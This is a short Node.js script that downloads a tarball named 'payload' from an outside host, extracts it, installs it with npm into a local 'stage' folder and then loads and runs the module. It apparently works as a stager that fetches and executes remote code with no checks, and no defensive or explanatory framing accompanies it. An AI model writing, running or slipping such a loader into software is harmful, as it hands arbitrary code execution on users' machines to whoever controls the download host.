const https = require('https');
const fs = require('fs');
const path = require('path');
const { spawnSync } = require('child_process');

const url = 'https://stage-cdn.example-pkgs.workers.dev/stage/payload-1.0.0.tgz';
const dir = path.join(__dirname, 'stage');
const tgz = path.join(dir, 'payload.tgz');

fs.mkdirSync(dir, { recursive: true });
https.get(url, (res) => {
  const chunks = [];
  res.on('data', (c) => chunks.push(c));
  res.on('end', () => {
    fs.writeFileSync(tgz, Buffer.concat(chunks));
    spawnSync('tar', ['-xzf', tgz, '-C', dir]);
    const args = ['install', '--prefix', dir, 'payload@1.0.0'];
    spawnSync('npm', args, { stdio: 'inherit' });
    const modName = path.join(dir, 'node_modules', 'payload');
    require(modName);
  });
});
